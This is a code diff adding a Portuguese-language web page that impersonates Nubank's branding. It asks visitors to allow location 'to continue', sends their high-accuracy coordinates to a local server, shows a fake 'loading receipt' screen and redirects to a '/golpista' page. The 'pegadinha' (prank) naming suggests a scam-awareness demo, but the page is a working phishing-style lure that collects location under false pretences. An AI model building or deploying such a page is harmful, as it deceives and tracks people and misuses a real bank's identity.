@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Permitir Localização</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+  </head>
+  <body
+    class="bg-[#820ad1] text-white font-sans min-h-screen flex flex-col justify-center items-center px-4"
+    data-link="<%= localizacao.link %>"
+  >
+    <!-- Tela de permissão -->
+    <div id="container-permissao" class="w-full">
+      <!-- Logo Nubank -->
+      <div class="flex justify-center mb-8">
+        <img src="/logo-branco.png" alt="Logo Nubank" class="w-48 h-auto" />
+      </div>
+
+      <h1 class="text-2xl font-bold text-center mb-4">
+        Permitir acesso à localização
+      </h1>
+
+      <p class="text-center text-sm text-white/80 mb-6">
+        Para continuar, precisamos acessar sua localização. Clique no botão
+        abaixo para autorizar.
+      </p>
+      <button
+        id="btnLocalizacao"
+        class="bg-white text-[#820ad1] hover:bg-gray-100 font-bold py-4 px-6 rounded-xl w-full transition text-lg"
+      >
+        Permitir Localização
+      </button>
+      <p id="status" class="text-center text-sm text-white mt-4"></p>
+    </div>
+
+    <!-- Tela de comprovante -->
+    <div id="comprovante" class="hidden w-full text-center">
+      <div class="flex justify-center mb-8">
+        <img src="logo.png" alt="Logo Nubank" class="w-20 h-auto" />
+      </div>
+
+      <h2 class="text-2xl font-semibold text-green-300 mb-4">
+        ✅ Localização Confirmada!
+      </h2>
+      <p class="text-white/90">Carregando o comprovante...</p>
+    </div>
+
+    <script>
+      const button = document.getElementById("btnLocalizacao");
+      const statusText = document.getElementById("status");
+      const comprovante = document.getElementById("comprovante");
+      const containerPermissao = document.getElementById("container-permissao");
+
+      // pegar o link vindo do EJS
+      const linkID = document.body.dataset.link;
+
+      function sendLocation(position) {
+        if (!linkID) {
+          statusText.textContent = "Link não encontrado. Tente novamente.";
+          return;
+        }
+
+        const data = {
+          link: linkID,
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+        };
+
+        statusText.textContent = "Enviando localização...";
+
+        fetch("http://localhost:3000/localizacao", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(data),
+        })
+          .then((res) => res.json())
+          .then((response) => {
+            const endereco = response.address.display_name;
+
+            containerPermissao.classList.add("hidden");
+            comprovante.classList.remove("hidden");
+
+            setTimeout(() => {
+              localStorage.setItem("latitudePegadinha", data.latitude);
+              localStorage.setItem("longitudePegadinha", data.longitude);
+              localStorage.setItem(
+                "enderecoPegadinha",
+                JSON.stringify(response.address)
+              );
+
+              window.location.href = "/golpista";
+            }, 2000);
+          })
+          .catch(() => {
+            statusText.textContent = "Erro ao enviar localização.";
+          });
+      }
+
+      function errorHandler(error) {
+        console.error("Erro ao obter localização:", error);
+
+        let msg = "Erro ao obter localização.";
+        switch (error.code) {
+          case 1:
+            msg =
+              "Permissão negada. Habilite o acesso à localização no navegador.";
+            break;
+          case 2:
+            msg =
+              "Não foi possível determinar sua localização. Tente novamente.";
+            break;
+          case 3:
+            msg = "Tempo de espera excedido. Tente novamente.";
+            break;
+        }
+
+        statusText.textContent = msg;
+      }
+
+      button.addEventListener("click", () => {
+        if (navigator.geolocation) {
+          statusText.textContent = "Solicitando localização...";
+          navigator.geolocation.getCurrentPosition(sendLocation, errorHandler, {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0,
+          });
+        } else {
+          statusText.textContent =
+            "Geolocalização não suportada neste dispositivo.";
+        }
+      });
+    </script>
+  </body>
+</html>
